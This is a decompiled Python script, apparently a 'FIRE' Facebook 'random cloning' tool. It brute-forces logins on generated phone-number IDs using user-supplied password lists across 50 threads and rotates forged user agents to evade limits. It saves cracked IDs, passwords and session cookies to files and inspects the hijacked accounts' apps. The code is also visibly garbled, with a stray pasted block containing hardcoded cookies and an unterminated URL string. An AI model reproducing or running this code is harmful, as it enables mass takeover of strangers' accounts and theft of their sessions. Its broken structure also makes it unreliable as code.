# Source Generated with Decompyle++
# File: test.pyc (Python 3.9)

import os
import sys
import time
import requests
import uuid
os.system('git pull')
os.system('pkg install curl')

class jalan:
    
    def __init__(self, z):
        pass


logo = '   \n\x1b[1;32m       d8888 8888888b.  8888888 Y88b   d88P     d8888 888b    888   \n\x1b[1;35m       d88888 888   Y88b   888    Y88b d88P     d88888 8888b   888 .      \n\x1b[1;32m       d88P888 888    888   888     Y88o88P     d88P888 88888b  888   \n\x1b[1;32m       d88P 888 888   d88P   888      Y888P     d88P 888 888Y88b 888  \n\x1b[1;35m       d88P  888 8888888P"    888       888     d88P  888 888 Y88b888 \n\x1b[1;35m       d88P   888 888 T88b     888       888    d88P   888 888  Y88888 \n\x1b[1;32m       d88P     888 888   T88b 8888888     888  d88P     888 888    Y888   \n\n\x1b[1;37m================= \x1b[32;45mFIRE\x1b[0;m =====================\n\x1b[1;32m     \x1b[1;33mCREATED BY\x1b[0;m   :  \x1b[1;33mFt Alvi\x1b[0;m\x1b[1;32m && \x1b[1;33mFIRE\x1b[0;m\n\x1b[1;32m     \x1b[1;32mFACEBOK      : \x1b[1;34m Ft Alvi\n\x1b[1;32m     \x1b[1;35mGITHUB       :  \x1b[1;35mACTION-FIRE\n\x1b[1;32m     \x1b[1;36mTOOL STATUS  :  \x1b[1;36mTOOL IS FREE\n\x1b[1;32m     \x1b[1;35mTEAM         :  \x1b[1;35mA-F\n\x1b[1;32m     \x1b[1;36mTOOL VIRSION :  \x1b[1;36mV.8.3\n\x1b[1;37m================= \x1b[32;45mFIRE\x1b[0;m =====================\n\n       \x1b[37;41m\t WELLCOME TO FIRE TOOL\x1b[0;m\n\n\x1b[1;37m================== \x1b[32;45mNIDA\x1b[0;m ======================\n'

def ud():
    os.system('clear')
    jalan(logo)
    print(' [1] FOLLOW ME ON FB')
    print(' [2] EXIT')
    opt = input('\n   Choose option >>> ')
    if opt == '1':
        os.system('xdg-open https://facebook.com/ft.alvi.18')
        FD()
        return opt
    opt('\n\x1b[1;31mEXIT\x1b[0;97m')


def FD():
    os.system('clear')
    print(logo)
    print('\x1b[1;33m [1] FOLLOW MY FACEBOOK PAGE')
    print(' [2] EXIT')
    opt = input('\n  \x1b[1;32m Choose option >>> ')
    if opt == '1':
        os.system('xdg-open https://facebook.com/𝙈𝙍-𝘼𝘿𝙊𝙍-107968471946247')
        o()
        return opt
    opt('\n\x1b[1;31mEXIT\x1b[0;97m')


def o():
    os.system('clear')
    jalan(logo)
 
    print('')
    jalan('\x1b[1;32m [1]\x1b[1;33m RANDOM CRACK ')
    jalan('\x1b[1;32m [2] \x1b[1;32mCONTACT ME ON FACEBOOK')
    jalan(' \x1b[1;32m[3] \x1b[1;32mSUBSCRIBE MY CHANNEL')
    jalan(' \x1b[1;32m[4] \x1b[1;32mFOLLOW FB PAGE')
    jalan(' \x1b[1;32m[00] \x1b[1;31mEXIT')
    opt = input('\n   \x1b[1;32m Choose option >>> ')
    if opt == '1':
        i()
    if opt == '2':
        os.system('xdg-open https://facebook.com/ft.alvi.18')
        return opt
    if opt == '3':
        os.system('xdg-open https://youtube.com/@Learnwithshuvo928')
        return opt
    if opt == '4':
        os.system('xdg-open https://facebook.com/𝙈𝙍-𝘼𝘿𝙊𝙍-107968471946247')
        return opt
    if opt == '0':
        os.system('exit')
        return opt
    opt('\n\x1b[1;31m  Choose valid option\x1b[0;97m')


import os,sys,time,json,random,re,string,platform,base64,uuid
os.system("git pull")
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
    
def cek_apk(session,coki):
    w=session.get("https://free.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSorry there is no Active  Apk%s  '%(N,M,N,M,N))
    else:
        print(f'\r[ðŸŽ®] %s \x1b[1;95m â˜† Your Active Apps â˜†     :{WHITE}'%(GREEN))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
        #else:
            #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
    w=session.get("https://free.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSorry there is no Expired Apk%s           \n'%(N,M,N,M,N))
    else:
        print(f'\r[ðŸŽ®] %s \x1b[1;95m â—‡ Your Expired Apps â—‡    :{WHITE}'%(M))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
        else:
            print('')
 
def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://free.facebook.com/profile.php?id=100015315258519', {
            'cookie': coki }, **('cookies',)).text, 'html.parser')
        get = r.find('a', 'Ikuti', **('string',)).get('href')
        session.get('https://free.facebook.com' + str(get), {
            'cookie': coki }, **('cookies',)).text
            
            
 
class jalan:
    def __init__(self, z):
        for e in z + "\n":
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.009)
            
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' #
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
A = '\x1b[1;90m' # WARNA ABU ABU
BN = '\x1b[1;107m' # BELAKANG PUTIH
BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT
BP = '\x1b[1;105m' # BELAKANG PINK
BB = '\x1b[1;104m' # BELAKANG BIRU
BK = '\x1b[1;103m' # BELAKANG KUNING
BH = '\x1b[1;102m' # BELAKANG HIJAU
BM = '\x1b[1;101m' # BELAJANG MERAH
BA = '\x1b[1;100m' # BELAKANG ABU ABU
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today()
logo =                                          ("""   


  

\033[1;34m   ____  _   __      ______________  ______
\033[1;32m  / __ \/ | / /     / ____/  _/ __ \/ ____/
\033[1;91m / / / /  |/ /_____/ /_   / // /_/ / __/   
\033[1;35m/ /_/ / /|  /_____/ __/ _/ // _, _/ /___   
\033[1;91m\____/_/ |_/     /_/   /___/_/ |_/_____/   


   
                                         
                
\033[1;91m╔════════════════════════════════════════╗
\033[1;32m║\033[1;32m[•] Author    \033[1;32m : ACTION-FIRE            \033[1;32m║      
\033[1;32m║\033[1;32m[•] Facebook   \033[1;32m: Ft Alvi                ║ 
\033[1;32m║\033[1;32m[•] Github    \033[1;32m : github.com/ACTION-FIRE ║
\033[1;32m║\033[1;32m[•] Status    	\033[1;32m: FREE TRIAL             \033[1;32m║
\033[1;32m║\033[1;32m[•] Network    \033[1;32m: 3G, 4G/5G, ON          \033[1;32m║
\033[1;32m║\033[1;32m[•] Version  	\033[1;32m: V:2.1                  ║
\033[1;32m║\033[1;32m[•] Tools    	\033[1;32m: RAN/DOM Cloning        \033[1;32m║
\033[1;32m║════════════════════════════════════════║
\033[1;32m║════════════════════════════════════════║
\033[1;32m║              \033[1;32mAlvi MENU [👑]            ║
\033[1;91m╚════════════════════════════════════════╝""")
loop = 0
oks = []
cps = []
 
def clear():
    os.system('clear')
    print(logo)
from time import localtime as lt
from os import system as cmd
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
    
    
try:
    print('\n\n\033[1;33mLoading asset files ... \033[0;97m')
    v = 5.2
    update = ('5.2')
    update = ('5.2')
    if str(v) in update:
        os.system('clear')
    else:pass
except:print('\n\033[1;31mNo internet connection ... \033[0;97m')
#global functions
def dynamic(text):
    titik = ['.   ','..  ','... ','.... ']
    for o in titik:
        print('\r'+text+o),
        sys.stdout.flush();time.sleep(1)
 
#User agents
ugen2=[]
ugen=[]
 
for xd in range(10000):
    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)
    
# APK CHECK
def i():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system("clear")
    jalan(logo)
    
    
    jalan("\033[1;37m\t  USE OUR COUNTRY CODE  ")
    jalan('\033[1;36m     \t     PAK CODES\n     \033[1;33m92301, \033[1;33m92302 ,\033[1;33m92303 ,\033[1;33m92305  ...\033[0;97m')
    jalan('\033[1;32m============================================')
    jalan('\033[1;36m     \t     INDIA CODES\n     \033[1;33m91778, \033[1;33m91930 ,\033[1;33m91902 ,\033[1;33m91712  ...\033[0;97m')
    jalan('\033[1;32m============================================')
    jalan('\033[1;36m     \t     BD CODES\n     \033[1;33m88016, \033[1;33m88017 ,\033[1;33m88018 ,\033[1;33m88019  ...\033[0;97m')
    jalan('\033[1;32m============================================\n')
    code = input(' PUT CODE : ')
    print("")
    limit = int(input(' EXAMPLE: 2000, 3000, 50000, 100000\n\n PUT CLONING LIMIT: '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    os.system("clear")
    print(logo)
    passx = int(input("[*] Enter Password Limit : "))
    HamiiID = []
    print("")
    for bilal in range(passx):
        pww = input("[*] Enter Password : ")
        HamiiID.append(pww)
    with ThreadPool(max_workers=50) as manshera:
        clear()
        tl = str(len(user))
        print('\033[1;36m TOTAL IDS: '+tl)
        print('\033[1;36m THE PROCESS HAS BEEN STARTED')
        print('\033[1;31m USE AEROPLANE MOOD IN EVERY 4 MIN ')
        print('\033[1;31m ============================================')
        for love in user:
            pwx = [love[1:]]
            uid = code+love
            for Eman in HamiiID:
                pwx.append(Eman)
            manshera.submit(rcrack,uid,pwx,tl)
    print('\033[1;32m============================================')
    print('Crack process has been completed')
    print('Ids saved in ok.txt,cp.txt')
    print('\033[1;31m ============================================')
 
def rcrack(uid,pwx,tl):
    #print(user)
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            free_fb = session.get('https://free.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            import requests

import requests

cookies = {
    'sb': 'AvTmYzvHxvyFW6NqUI1M80ss',
    'datr': 'AvTmYwk5TZy2cAOdSoFVnU_9',
    'locale': 'en_US',
    'vpd': 'v1%3B772x412x1.75',
    'dpr': '1.75',
    'wd': '412x772',
    'fr': '0QEZmxR2vrmUVGYnI.AWVKwjOHZf-WBa7_ErCTkNi0944.Bj5vQC.vU.AAA.0.0.Bj6Eca.AWWzhh_lOt8',
}

headers = {
    'authority': 'mbasic.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'accept-language': 'en-AS,en;q=0.9,bn-BD;q=0.8,bn;q=0.7,en-GB;q=0.6,en-US;q=0.5',
    'cache-control': 'max-age=0',
    # 'cookie': 'sb=AvTmYzvHxvyFW6NqUI1M80ss; datr=AvTmYwk5TZy2cAOdSoFVnU_9; locale=en_US; vpd=v1%3B772x412x1.75; dpr=1.75; wd=412x772; fr=0QEZmxR2vrmUVGYnI.AWVKwjOHZf-WBa7_ErCTkNi0944.Bj5vQC.vU.AAA.0.0.Bj6Eca.AWWzhh_lOt8',
    'referer': 'https://mbasic.facebook.com/',
    'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Linux"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
}

response = requests.get('https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8
    cookies=cookies,
    headers=headers,
)
            lo = session.post(  'https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8,data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print('    \033[1;32m(FIRE-OKðŸ”¥)  ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/FIRE-OK.txt', 'a').write( cid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('    \33[1;30m(FIRE-CPðŸ¤•)  ' +cid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/FIRE-CP.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r     %s[FIRE] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
 
ud()
 
